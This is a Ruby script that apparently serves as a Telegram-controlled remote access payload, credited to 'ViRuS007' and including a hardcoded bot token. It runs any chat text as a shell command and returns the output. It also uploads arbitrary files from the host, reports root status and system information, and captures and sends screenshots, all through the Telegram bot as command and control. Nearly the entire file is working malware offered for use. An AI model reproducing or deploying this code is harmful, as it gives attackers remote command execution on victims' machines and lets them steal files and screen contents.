#!/usr/bin/ruby

#   Coded by ViRuS007

require "telegram/bot"
require "cloudinary"
require "json"
require "dropbox_api"
#require modules
require_relative "lib/check_root"
require_relative "lib/info"
require_relative "lib/screenShot"

#Token bot
$TOKEN = "304212840:AAHy8zMXUrWopY0SUzuwMkU7GpLxAil69HQ"

Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
    begin
        bot.listen do |message|
            #bot.api.send_message(chat_id: message.chat.id, text: "Bot Has running...")

            # Download picture
            if m = message.text.match(/\/down_pic (.*)/)
              puts m[1]
              bot.api.send_message(chat_id: message.chat.id, text: "[+] Downloading and Uploading to Telegram...\nPlease waiting...")
              bot.api.send_photo(chat_id: message.chat.id, photo: Faraday::UploadIO.new(m[1], 'image'))
            end
            #Download Documnet
            if m2 = message.text.match(/\/down_doc (.*)/)
              puts m2[1]
              bot.api.send_message(chat_id: message.chat.id, text: "[+] Downloading and Uploading to Telegram...\nPlease waiting...")
              bot.api.send_document(chat_id: message.chat.id, document: Faraday::UploadIO.new(m2[1], 'document'))
            end
            #Download Video
            if m3 = message.text.match(/\/down_vid (.*)/)
              puts m3[1]
              bot.api.send_message(chat_id: message.chat.id, text: "[+] Downloading and Uploading to Telegram...\nPlease waiting...")
              #send to telegram
              bot.api.send_video(chat_id: message.chat.id, video: Faraday::UploadIO.new(m3[1], 'video'))
            end
            #Download Audio
            if m4 = message.text.match(/\/down_audio (.*)/)
              puts m4[1]
              bot.api.send_message(chat_id: message.chat.id, text: "[+] Downloading and Uploading to Telegram...\nPlease waiting...")
              #send to telegram
              bot.api.send_audio(chat_id: message.chat.id, audio: Faraday::UploadIO.new(m4[1], 'audio'))
            end

            case message.text
            when '/start'
                #create a class
                c_checkRoot = Check_Root.new
                #save output in vaariable
                isRoot = c_checkRoot.check_root
                #send to telegram
                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\nAccess system is Root? : #{isRoot}\n\nEnter /help to see commands!")

            #Help command
            when '/help'
                help = """Help:
    /info => To Get ip and system info
    /screenShot => Get ScreenShot of system
    /down_pic [image name + path]  =>  Uploading File (Demo)

for run shell command just send without `/` and \nRecive result.

Coded By : ViRuS007
Email : virus007@protonmail.com
Telegram ID : @Msf_Payload

Github: http://github.com/shayanzare/telegram-payload
                """
                bot.api.send_message(chat_id: message.chat.id, text: "#{help}")

            #Get info of system
            when '/info'
              c_info = Info.new
              info = c_info.get_info
              #sen output to telegram
              bot.api.send_message(chat_id: message.chat.id, text: info)

            #Take screenshot with terminal (import) and cmd
            when "/screenShot"
                #check operatations system
                if RUBY_PLATFORM =~ /win32/
                    #windows platform

                else
                    #linux platform
                    bot.api.send_message(chat_id: message.chat.id, text: "[!] Taking Screenshot and Uploading...\nPlease wait...")

                    screenshot = ScreenShot.new
                    get_screen_l = screenshot.get_screen_linux

                    #send result to telegram bot
                    bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{get_screen_l}")
                    #upload in telegram
                    bot.api.send_photo(chat_id: message.chat.id, photo: Faraday::UploadIO.new('screenshot.png', 'image/png'))
                end
            #Get other command
            else
                command = message.text
                result = %x{#{command}}
                bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
        end
    end
    rescue
        puts "Error"
        retry
    end
end
